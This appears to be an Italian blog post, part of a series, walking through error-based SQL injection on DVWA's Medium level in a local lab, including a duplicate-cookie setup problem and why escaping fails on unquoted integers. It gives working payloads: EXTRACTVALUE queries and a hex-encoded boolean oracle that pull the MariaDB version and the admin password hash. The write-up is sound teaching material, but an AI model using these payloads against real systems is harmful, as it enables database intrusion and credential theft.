---
layout: post
title: "Error-based SQL Injection su DVWA Medium: quando il cookie ti mente"
date: 2026-05-30
categories: [web-security, walkthrough]
tags: [sqli, error-based, dvwa, mariadb, burp-suite, hex-encoding]
excerpt: "Pensavo di star testando il livello Medium da dieci minuti. Ero ancora su Low. Un cookie duplicato era il colpevole, e una volta risolto, ho scoperto che mysqli_real_escape_string() su un intero senza apici è praticamente decorativo."
lang: it
page_id: error-based-sql-injection-dvwa-medium
permalink: /posts/sql-injection-error-based-dvwa-medium/
---

*Questa è la Parte 2 della sessione sulla injection error-based. [La Parte 1]({% post_url 2026-05-30-sql-injection-error-based-dvwa-low %}) ha coperto la tecnica su DVWA Low — EXTRACTVALUE, il limite dei 31 caratteri e CASE WHEN su MariaDB. Questa parte riprende dal cliffhanger: pensavo di essere passato a Medium, ma il cookie aveva altri piani.*

---

Passare DVWA da Low a Medium dovrebbe essere semplice: DVWA Security → imposta Medium → salva. Invece per dieci minuti niente funzionava come mi aspettavo — il form mostrava ancora il campo di testo di Low, il footer della pagina diceva `low`, e il payload che avevo appena testato con successo continuava a funzionare perfettamente.

Il che era il problema.

## Il cookie che continuava a mentirmi

Il colpevole era nell'header del cookie:

```
Cookie: security=low; PHPSESSID=...; security=medium
```

Due valori `security`. Il browser stava mandando il vecchio cookie `security=low` insieme al nuovo `security=medium`, e il server prendeva il primo. Burp stava intercettando richieste che sembravano Medium ma venivano ancora eseguite come Low. Il payload funzionava perché stavo testando la cosa sbagliata per intero.

Fix: cancellare tutti i cookie di DVWA, rifare login, impostare Medium, avviare un nuovo intercept. Dopodiché il footer mostrava correttamente `Security Level: medium` e il form era cambiato in un `<select>` a discesa con valori da 1 a 5.

Dieci minuti persi per un cookie duplicato. Questo è normale.

## Il menu a tendina non è una difesa

Medium sostituisce il campo di testo con un elemento `<select>` che offre solo i valori da 1 a 5. L'intenzione è limitare cosa l'utente può inviare. Il problema: il `<select>` viene applicato solo nel browser. Il server accetta qualsiasi cosa arrivi nel body della POST.

In Burp Repeater, cambi `id=1` in `id=qualsiasicosa` indipendentemente da cosa offra il menu a tendina. Le restrizioni lato client non sono un controllo di sicurezza. Sono un suggerimento.

## Scoprire l'injection senza vedere il codice sorgente

Su Medium non sai in anticipo se l'input usa gli apici o no. L'approccio: sondare entrambi i contesti e leggere il comportamento.

**`id=1'` via POST:**

```
You have an error in your SQL syntax... near '\''
```

L'errore mostra `\'` — l'apice è stato escapato da `mysqli_real_escape_string()`. Injection basata su stringa con apici: bloccata.

**`id=1 AND 1=1--+` via POST:** utente visibile.

**`id=1 AND 1=2--+` via POST:** pagina vuota.

Due comportamenti diversi da `1=1` e `1=2`. Injection confermata in contesto intero — nessun apice necessario.

Puoi dedurre il contesto senza vedere il sorgente: se fosse stato applicato `intval()`, `1 AND 1=1` sarebbe stato troncato a `1` ed entrambe le condizioni avrebbero restituito lo stesso risultato. Non l'hanno fatto — quindi l'input è arrivato intatto e senza apici al parser SQL.

## Perché `mysqli_real_escape_string()` fallisce qui

Il codice sorgente di Medium fa questo:

```php
$id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $_POST['id']);
$query = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
```

`$id` non è dentro apici nella query. `mysqli_real_escape_string()` escapa i caratteri pericolosi dentro una stringa tra apici — ma qui non c'è nessuna stringa tra apici. L'input atterra direttamente nella SQL come un intero nudo. Escapare gli apici su un intero senza apici è come mettere una serratura su una porta senza pareti.

## Error-based su Medium — e il bypass in esadecimale

`EXTRACTVALUE` funziona allo stesso modo su Medium, solo senza apici nell'injection stessa:

```
id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--+&Submit=Submit
```

Risposta:

```
XPATH syntax error: '~10.1.26-MariaDB-0+deb9u1'
```

Ma estrarre la password di un utente specifico richiede un confronto tra stringhe: `WHERE user='admin'`. Su Medium, quell'apice viene escapato in `WHERE user=\'admin\'` — rotto.

Il bypass: encoding esadecimale invece di stringhe letterali. `'admin'` in esadecimale ASCII è `0x61646d696e`. MariaDB lo decodifica automaticamente, nessun apice richiesto:

```
id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users WHERE user=0x61646d696e)))--+&Submit=Submit
```

Risposta:

```
XPATH syntax error: '~5f4dcc3b5aa765d61d8327deb882cf9'
```

Stesso hash. Zero apici. `mysqli_real_escape_string()` non aveva nulla su cui lavorare.

Per convertire stringhe in esadecimale in Burp: tab **Decoder** → incolla la stringa → **Encode as... → ASCII hex** → prependi `0x`.

## Rendering condizionale con l'esadecimale

L'oracolo booleano della sessione blind funziona anche qui, adattato per il contesto intero e l'encoding esadecimale:

```
id=1 AND SUBSTRING((SELECT password FROM users WHERE user=0x61646d696e),1,1)=0x35--+&Submit=Submit
```

- `0x61646d696e` = `admin`
- `0x35` = `5`

Risposta: utente visibile. Primo carattere confermato `5`. Pagina mostrata contro pagina vuota è l'oracolo — stesso concetto blind booleano, ma instradato attraverso un contesto dove gli apici sono bloccati e l'esadecimale è l'escamotage.

## Takeaways

- **`mysqli_real_escape_string()` su un intero senza apici è inutile.** Nessun contesto stringa, niente da escapare. La difesa è applicata nel posto sbagliato.
- **L'encoding esadecimale bypassa i filtri basati sugli apici.** `0x61646d696e` è `admin` senza un singolo apice in vista. Quando i letterali stringa sono bloccati, i letterali esadecimali funzionano.
- **Le restrizioni lato client non sono controlli di sicurezza.** Un menu a tendina `<select>` ferma un utente casuale. Burp lo ignora completamente.
- **I conflitti nei cookie possono rompere silenziosamente il tuo ambiente di test.** Controlla quale livello di sicurezza il server sta effettivamente ricevendo, non quello che pensi di aver impostato. Il footer non mente — il cookie forse sì.

## Riferimenti utili

- [PortSwigger — SQL injection with conditional errors](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)
- [PayloadsAllTheThings — Error-based injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#error-based-injection)
- [MariaDB — EXTRACTVALUE](https://mariadb.com/kb/en/extractvalue/)

---

*Tutte le tecniche mostrate sono state eseguite in un ambiente di laboratorio isolato via Docker sul mio computer locale. Attaccare sistemi che non possiedi o per cui non hai un'autorizzazione scritta è illegale nella maggior parte delle giurisdizioni.*
